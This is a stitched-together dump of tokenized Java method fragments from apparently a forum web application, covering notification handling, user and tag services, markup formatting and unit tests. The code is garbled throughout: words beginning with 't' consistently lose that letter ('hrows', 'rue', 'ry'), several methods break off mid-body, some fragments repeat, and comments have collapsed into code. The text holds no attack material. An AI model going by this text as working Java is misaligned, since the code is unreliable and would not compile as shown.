public PreparedEditInfoSummary prepareEditInfo ( EditInfoSummary editInfo ) { String lastEditor = userDao . getUserCached ( editInfo . editor ( ) ) . getNick ( ) ; int editCount = editInfo . editCount ( ) ; Date lastEditDate = editInfo . editdate ( ) ; return PreparedEditInfoSummary . apply ( lastEditor , editCount , lastEditDate ) ; } 
public String resetNotifications ( HttpServletRequest request , @RequestParam int opId ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " not authorized " ) ; } User currentUser = mpl . getCurrentUser ( ) ; userEventService . resetUnreadReplies ( currentUser , opId ) ; return " ok " ; } 
public RedirectView resetNotifications ( HttpServletRequest request , @RequestParam int opId ) hrows Exception { apiController . resetNotifications ( request , opId ) ; RedirectView view = new RedirectView ( " /notifications " ) ; view . setExposeModelAttributes ( false ) ; return view ; } 
public ModelAndView showNotifications ( HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , defaultValue = " all " ) String filter , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " not authorized " ) ; } Map < String , Object > params = new HashMap < > ( ) ; UserEventFilterEnum eventFilter = UserEventFilterEnum . fromNameOrDefault ( filter ) ; params . put ( " filter " , eventFilter . getName ( ) ) ; User currentUser = mpl . getCurrentUser ( ) ; String nick = currentUser . getNick ( ) ; params . put ( " nick " , nick ) ; if ( eventFilter ! = UserEventFilterEnum . ALL ) { params . put ( " addition_query " , " &filter= " + eventFilter . getName ( ) ) ; } else { params . put ( " addition_query " , " " ) ; } if ( offset < 0 ) { offset = 0 ; } boolean firstPage = offset = = 0 ; int opics = mpl . getProf ( ) . getTopics ( ) ; if ( opics > 200 ) { opics = 200 ; } params . put ( " firstPage " , firstPage ) ; params . put ( " opics " , opics ) ; params . put ( " offset " , offset ) ; params . put ( " disable_event_header " , rue ) ; long ime = System . currentTimeMillis ( ) ; int delay = firstPage ? 90 : 60 * 60 ; response . setDateHeader ( " Expires " , ime + 1000 * delay ) ; params . put ( " unreadCount " , currentUser . getUnreadEvents ( ) ) ; params . put ( " isMyNotifications " , rue ) ; response . addHeader ( " Cache-Control " , " no-cache " ) ; List < UserEvent > list = userEventService . getRepliesForUser ( currentUser , rue , opics , offset , eventFilter ) ; List < PreparedUserEvent > prepared = userEventService . prepare ( list , false , request . isSecure ( ) ) ; if ( ! list . isEmpty ( ) ) { params . put ( " enableReset " , rue ) ; params . put ( " opId " , list . get ( 0 ) . getId ( ) ) ; } params . put ( " opicsList " , prepared ) ; params . put ( " hasMore " , list . size ( ) = = opics ) ; return new ModelAndView ( " show-replies " , params ) ; } 
public void resetUnreadReplies ( int userId , int opId ) { jdbcTemplate . update ( " UPDATE user_events SET unread=false WHERE userid=? AND unread AND id<=? " , userId , opId ) ; recalcEventCount ( ImmutableList . of ( userId ) ) ; } 
public void resetUnreadReplies ( User user , int opId ) { userEventDao . resetUnreadReplies ( user . getId ( ) , opId ) ; } 
public ModelAndView showNotifications ( HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , defaultValue = " all " ) String filter , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " not authorized " ) ; } Map < String , Object > params = new HashMap < > ( ) ; UserEventFilterEnum eventFilter = UserEventFilterEnum . fromNameOrDefault ( filter ) ; params . put ( " filter " , eventFilter . getName ( ) ) ; User currentUser = mpl . getCurrentUser ( ) ; String nick = currentUser . getNick ( ) ; params . put ( " nick " , nick ) ; if ( eventFilter ! = UserEventFilterEnum . ALL ) { params . put ( " addition_query " , " &filter= " + eventFilter . getName ( ) ) ; } else { params . put ( " addition_query " , " " ) ; } if ( offset < 0 ) { offset = 0 ; } boolean firstPage = offset = = 0 ; int opics = mpl . getProf ( ) . getTopics ( ) ; if ( opics > 200 ) { opics = 200 ; } params . put ( " firstPage " , firstPage ) ; params . put ( " opics " , opics ) ; params . put ( " offset " , offset ) ; params . put ( " disable_event_header " , rue ) ; long ime = System . currentTimeMillis ( ) ; int delay = firstPage ? 90 : 60 * 60 ; response . setDateHeader ( " Expires " , ime + 1000 * delay ) ; params . put ( " unreadCount " , currentUser . getUnreadEvents ( ) ) ; params . put ( " isMyNotifications " , rue ) ; response . addHeader ( " Cache-Control " , " no-cache " ) ; List < UserEvent > list = userEventService . getRepliesForUser ( currentUser , rue , opics , offset , eventFilter ) ; List < PreparedUserEvent > prepared = prepareService . prepare ( list , false , request . isSecure ( ) ) ; if ( ! list . isEmpty ( ) ) { params . put ( " enableReset " , rue ) ; params . put ( " opId " , list . get ( 0 ) . getId ( ) ) ; } params . put ( " opicsList " , prepared ) ; params . put ( " hasMore " , list . size ( ) = = opics ) ; return new ModelAndView ( " show-replies " , params ) ; } 
public void ignoreAdd ( User user , String agName ) hrows TagNotFoundException { userTagDao . addTag ( user . getId ( ) , agService . getTagId ( agName ) , false ) ; } 
public void ignoreDel ( User user , String agName ) hrows TagNotFoundException { userTagDao . deleteTag ( user . getId ( ) , agService . getTagId ( agName ) , false ) ; } 
private List < String > parseTags ( String ags , Errors errors ) { return JavaConverters . seqAsJavaListConverter ( TagName . parseAndValidateTags ( ags , errors , Integer . MAX_VALUE ) ) . asJava ( ) ; } 
public boolean hasFavoriteTag ( User user , String agName ) { return favoritesGet ( user ) . contains ( agName ) ; } 
public boolean hasIgnoreTag ( User user , String agName ) { return ignoresGet ( user ) . contains ( agName ) ; } 
private static List < String > errorsToStringList ( Errors errors ) { if ( errors . hasErrors ( ) ) { return errors . getAllErrors ( ) . stream ( ) . map ( ObjectError : : getCode ) . collect ( Collectors . oList ( ) ) ; 
public void addMultiplyTagsTest ( ) { UserTagService mockUserTagService = mock ( UserTagService . class ) ; when ( mockUserTagService . addMultiplyTags ( any ( User . class ) , anyString ( ) , anyBoolean ( ) ) ) . henCallRealMethod ( ) ; ry { doThrow ( new TagNotFoundException ( ) ) . when ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " uytutut " ) ) ; doThrow ( new DuplicateKeyException ( " duplicate " ) ) . when ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " ag3 " ) ) ; } catch ( Exception e ) { } List < String > strErrors = mockUserTagService . addMultiplyTags ( user , " ag1, tag2, tag3, uytutut, @#$%$# " , rue ) ; ry { verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " ag1 " ) ) ; verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " ag2 " ) ) ; verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " uytutut " ) ) ; verify ( mockUserTagService , never ( ) ) . favoriteAdd ( eq ( user ) , eq ( " @#$%$# " ) ) ; verify ( mockUserTagService , never ( ) ) . ignoreAdd ( any ( User . class ) , anyString ( ) ) ; } catch ( Exception e ) { } Assert . assertEquals ( 3 , strErrors . size ( ) ) ; reset ( mockUserTagService ) ; when ( mockUserTagService . addMultiplyTags ( any ( User . class ) , anyString ( ) , anyBoolean ( ) ) ) . henCallRealMethod ( ) ; ry { doThrow ( new TagNotFoundException ( ) ) . when ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " uytutut " ) ) ; doThrow ( new DuplicateKeyException ( " duplicate " ) ) . when ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " ag3 " ) ) ; } catch ( Exception e ) { } strErrors = mockUserTagService . addMultiplyTags ( user , " ag1, tag2, tag3, uytutut, @#$%$# " , false ) ; ry { verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " ag1 " ) ) ; verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " ag2 " ) ) ; verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " uytutut " ) ) ; verify ( mockUserTagService , never ( ) ) . ignoreAdd ( eq ( user ) , eq ( " @#$%$# " ) ) ; verify ( mockUserTagService , never ( ) ) . favoriteAdd ( any ( User . class ) , anyString ( ) ) ; } catch ( Exception e ) { } Assert . assertEquals ( 3 , strErrors . size ( ) ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean ech ) { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getRssTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . oString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . append ( " ; noTalks= " ) . append ( noTalks ) . append ( " ; tech= " ) . append ( ech ) . oString ( ) ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; opicListDto . setFromDate ( fromDate ) ; opicListDto . setNotalks ( noTalks ) ; opicListDto . setTech ( ech ) ; opicListDto . setLimit ( 20 ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return opicListDao . getTopics ( opicListDto ) ; } 
public Map < String , Integer > getYandexWidget ( HttpServletRequest request , HttpServletResponse response ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { return ImmutableMap . of ( ) ; 
public ModelAndView serverInfo ( ) { List < User > moderators = userService . getModerators ( ) ; ModelAndView mv = new ModelAndView ( " server " ) ; mv . getModel ( ) . put ( " moderators " , moderators ) ; List < User > correctors = userService . getCorrectors ( ) ; mv . getModel ( ) . put ( " correctors " , correctors ) ; return mv ; } 
public RedirectView showComments ( @RequestParam String nick ) hrows Exception { User user = userService . getUserCached ( nick ) ; return new RedirectView ( " search.jsp?range=COMMENTS&user= " + user . getNick ( ) + " &sort=DATE " ) ; } 
public ModelAndView showCommentsOld ( @PathVariable String nick , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } ModelAndView mv = new ModelAndView ( " deleted-comments " ) ; User user = userService . getUserCached ( nick ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " deletedList " , commentService . getDeletedComments ( user ) ) ; return mv ; } 
public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " ext " ) String ext , @PathVariable String nick ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } if ( ext . length ( ) > 255 ) { ext = ext . substring ( 0 , 255 ) ; } User user = mpl . getCurrentUser ( ) ; User refUser = userService . getUserCached ( nick ) ; remarkDao . setOrUpdateRemark ( user , refUser , ext ) ; return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public User getUser ( String nick ) hrows UserNotFoundException { return getUser ( findUserId ( nick ) ) ; } 
public int findUserId ( String nick ) hrows UserNotFoundException { if ( nick = = null ) { hrow new NullPointerException ( ) ; } if ( ! StringUtil . checkLoginName ( nick ) ) { logger . warn ( " Invalid user name '{}' " , nick ) ; hrow new UserNotFoundException ( " <invalid name> " ) ; } List < Integer > list = jdbcTemplate . queryForList ( queryUserIdByNick , Integer . class , nick ) ; if ( list . isEmpty ( ) ) { hrow new UserNotFoundException ( nick ) ; } if ( list . size ( ) > 1 ) { hrow new RuntimeException ( " list.size()>1 ??? " ) ; } return list . get ( 0 ) ; } 
private User getUserInternal ( int id ) hrows UserNotFoundException { List < User > list = jdbcTemplate . query ( queryUserById , ( rs , rowNum ) - > { return new User ( rs ) ; } , id ) ; if ( list . isEmpty ( ) ) { hrow new UserNotFoundException ( id ) ; } if ( list . size ( ) > 1 ) { hrow new RuntimeException ( " list.size()>1 ??? " ) ; } return list . get ( 0 ) ; } 
private Map < Integer , User > createIgnoreMap ( Set < Integer > ignoreList ) { Map < Integer , User > ignoreMap = new HashMap < > ( ignoreList . size ( ) ) ; for ( int id : ignoreList ) { ignoreMap . put ( id , userService . getUserCached ( id ) ) ; } return ignoreMap ; } 
public ModelAndView listDel ( ServletRequest request , @RequestParam int id ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; User delUser = userService . getUserCached ( id ) ; ignoreListDao . remove ( user , delUser ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
private RootNode prepareCommentRootNode ( boolean secure , boolean rss , boolean nofollow ) { RootNode rootNode = defaultParser . getRootNode ( ) ; rootNode . setCommentCutOptions ( ) ; rootNode . setUserService ( userService ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( oHtmlFormatter ) ; rootNode . setRss ( rss ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
private RootNode prepareTopicRootNode ( boolean minimizeCut , String cutURL , boolean secure , boolean nofollow ) { RootNode rootNode = defaultParser . getRootNode ( ) ; if ( minimizeCut ) { ry { LorURL lorCutURL = new LorURL ( siteConfig . getMainURI ( ) , cutURL ) ; if ( lorCutURL . isTrueLorUrl ( ) ) { URI fixURI = new URI ( lorCutURL . fixScheme ( secure ) , rue , " UTF-8 " ) ; rootNode . setMinimizedTopicCutOptions ( fixURI ) ; } else { rootNode . setMaximizedTopicCutOptions ( ) ; } } catch ( Exception e ) { rootNode . setMaximizedTopicCutOptions ( ) ; } } else { rootNode . setMaximizedTopicCutOptions ( ) ; } rootNode . setUserService ( userService ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( oHtmlFormatter ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( xtNode . getText ( ) ) . rim ( ) ; TagNode agNode = ( TagNode ) node ; RootNode rootNode = agNode . getRootNode ( ) ; ToHtmlFormatter oHtmlFormatter = rootNode . getToHtmlFormatter ( ) ; boolean secure = rootNode . isSecure ( ) ; UserService userService = rootNode . getUserService ( ) ; String result ; ry { if ( userService ! = null & & oHtmlFormatter ! = null ) { User user = userService . getUserCached ( memberName ) ; if ( ! user . isBlocked ( ) ) { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" %s \" >%s</a></span> " , oHtmlFormatter . memberURL ( user , secure ) , Parser . escape ( memberName ) ) ; rootNode . addReplier ( user ) ; } else { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href= \" %s \" >%s</a></s></span> " , oHtmlFormatter . memberURL ( user , secure ) , Parser . escape ( memberName ) ) ; } } else { result = Parser . escape ( memberName ) ; } } catch ( Exception ex ) { result = String . format ( " <s>%s</s> " , Parser . escape ( memberName ) ) ; } return result ; } 
public void init ( ) hrows Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . henReturn ( mainUrl ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( mock ( UserService . class ) ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; } 
public void initTest ( ) hrows Exception { UserService userService = mock ( UserService . class ) ; User splinter = mock ( User . class ) ; maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . henReturn ( false ) ; when ( JB . isBlocked ( ) ) . henReturn ( false ) ; when ( isden . isBlocked ( ) ) . henReturn ( rue ) ; when ( maxcom . getNick ( ) ) . henReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . henReturn ( " JB " ) ; when ( isden . getNick ( ) ) . henReturn ( " isden " ) ; when ( splinter . isBlocked ( ) ) . henReturn ( false ) ; when ( splinter . getNick ( ) ) . henReturn ( " splinter " ) ; when ( userService . getUserCached ( " splinter " ) ) . henReturn ( splinter ) ; when ( userService . getUserCached ( " maxcom " ) ) . henReturn ( maxcom ) ; when ( userService . getUserCached ( " JB " ) ) . henReturn ( JB ) ; when ( userService . getUserCached ( " isden " ) ) . henReturn ( isden ) ; when ( userService . getUserCached ( " hizel " ) ) . henThrow ( new UserNotFoundException ( " hizel " ) ) ; String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . henReturn ( mainUrl ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( userService ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; } 
public void init ( ) hrows Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . henReturn ( mainUrl ) ; oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( mock ( UserService . class ) ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void init ( ) hrows Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . henReturn ( mainUrl ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( mock ( UserService . class ) ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void initTest ( ) hrows Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . henReturn ( mainUrl ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( mock ( UserService . class ) ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; } 
public UserDetails loadUserByUsername ( String username ) hrows UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , rue ) ; if ( user = = null ) { hrow new UsernameNotFoundException ( username ) ; } } else { ry { user = userService . getUser ( username ) ; } catch ( UserNotFoundException e ) { hrow new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) , profileDao . readProfile ( user ) ) ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Topic . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String ext ) hrows IllegalArgumentException { ry { setValue ( messageDao . getById ( Integer . parseInt ( ext . split ( " , " ) [ 0 ] ) ) ) ; } catch ( MessageNotFoundException e ) { hrow new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( Comment . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String ext ) hrows IllegalArgumentException { if ( ext . isEmpty ( ) | | " 0 " . equals ( ext ) ) { setValue ( null ) ; return ; } ry { setValue ( commentDao . getById ( Integer . parseInt ( ext ) ) ) ; } catch ( MessageNotFoundException e ) { hrow new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( User . class , new UserPropertyEditor ( userService ) ) ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( SearchOrder . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String s ) hrows IllegalArgumentException { switch ( s ) { case " 1 " : for old links setValue(SearchOrder.RELEVANCE); break; case "2": setValue(SearchOrder.DATE); break; default: setValue(SearchOrder.valueOf(s)); break; } } }); binder.registerCustomEditor(SearchInterval.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchInterval.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(SearchRange.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchRange.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(User.class, new UserPropertyEditor(userService)); binder.setBindingErrorProcessor(new ExceptionBindingErrorProcessor()); } 
public void setAsText ( String s ) hrows IllegalArgumentException { if ( s . isEmpty ( ) ) { setValue ( null ) ; return ; } ry { setValue ( userService . getUser ( s ) ) ; 
private void rescueJB ( ) hrows Exception { final User user = userDao . getUser ( userDao . findUserId ( " JB " ) ) ; userDao . unblock ( user , user ) ; } 
private void rescueMaxcom ( ) hrows Exception { final User user = userDao . getUser ( userDao . findUserId ( " maxcom " ) ) ; userDao . updateUser ( user , MAXCOM_NAME , MAXCOM_URL , MAXCOM_EMAIL , MAXCOM_TOWN , MAXCOM_PASS , MAXCOM_INFO ) ; userDao . acceptNewEmail ( user , MAXCOM_EMAIL ) ; } 
private void rescueJB ( ) hrows Exception { final User user = userDao . getUser ( userDao . findUserId ( " JB " ) ) ; userDao . updateUser ( user , JB_NAME , JB_URL , JB_EMAIL , JB_TOWN , JB_PASS , JB_INFO ) ; userDao . acceptNewEmail ( user , JB_EMAIL ) ; userDao . unblock ( user , user ) ; } 
private static char firstNonQuote ( CharSequence buff , int start ) { for ( int pt = start - 1 ; pt > = 0 ; pt - - ) { if ( ! isQuoteChar ( buff . charAt ( pt ) ) ) return buff . charAt ( pt ) ; } return buff . charAt ( 0 ) ; } 
private static char lastNonQuote ( CharSequence buff , int start ) { for ( int pt = start + 1 ; pt < buff . length ( ) ; pt + + ) { if ( ! isQuoteChar ( buff . charAt ( pt ) ) ) return buff . charAt ( pt ) ; } return buff . charAt ( buff . length ( ) - 1 ) ; } 
private boolean isQuoteClosing ( CharSequence buff , int position ) { char before , after ; if ( position = = 0 & & localBuff . length ( ) = = 0 ) return false ; else if ( position = = buff . length ( ) - 1 ) return rue ; after = lastNonQuote ( buff , position ) ; if ( position = = 0 ) before = firstNonQuote ( localBuff , localBuff . length ( ) ) ; else before = firstNonQuote ( buff , position ) ; if ( isQuoteChar ( before ) ) return false ; if ( Character . isLetterOrDigit ( after ) ) return false ; return rue ; } 
public MoreLikeThisService moreLikeThisService ( ) { return Mockito . mock ( MoreLikeThisService . class ) ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , Profile profile , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > ags = opicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , ags . get ( message . getId ( ) ) , rue , null , secure , user , extMap . get ( message . getId ( ) ) , null ) ; TopicMenu opicMenu = getTopicMenu ( preparedMessage , user , profile , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , opicMenu ) ) ; } return pm ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , Profile profile , boolean loadUserpics ) { boolean opicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean agsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; boolean deletable ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , profile . getAvatarMode ( ) , rue ) ; } return new TopicMenu ( opicEditable , 
private String processMessage ( String msg , String mode ) { if ( " ntobr " . equals ( mode ) ) { return oLorCodeFormatter . format ( msg ) ; 
private String processMessage ( String msg , String mode ) { if ( msg = = null ) { return " " ; } if ( " ntobr " . equals ( mode ) ) { return oLorCodeFormatter . format ( msg ) ; 
public String format ( String ext ) { return ToLorCodeTexFormatter . quote ( ext , " [br] " ) ; } 
public String format ( String ext ) { return quote ( ext , " " ) ; } 
public static String escapeCode ( String ext ) { return CODE_ESCAPE_REGEXP . matcher ( ext ) . replaceAll ( " $1[[$2]] " ) ; } 
public void listTest2 ( ) { String a = " [list] n[*]one n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][*]two[br][*]three[br][/list] " , oLorCodeFormatter . format ( a ) ) ; assertEquals ( " [list] n[*]one n[*]two n[*]three n[/list] " , oLorCodeTexFormatter . format ( a ) ) ; toLorCodeFormatter.format(a) String b = toLorCodeFormatter.format(a); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, true, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, true, false) ); toLorCodeTexFormatter.format(a) b = toLorCodeTexFormatter.format(a); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, true, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", 
public void listTest3 ( ) { String a = " [list] n[*]one n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][br][*]two[br][*]three[br][/list] " , oLorCodeFormatter . format ( a ) ) ; assertEquals ( " [list] n[*]one n[*]two n[*]three n[/list] " , oLorCodeTexFormatter . format ( a ) ) ; toLorCodeFormatter.format(a, true) String b = toLorCodeFormatter.format(a); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, true, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, true, false) ); toLorCodeTexFormatter.format(a) b = toLorCodeTexFormatter.format(a); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, true, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", 
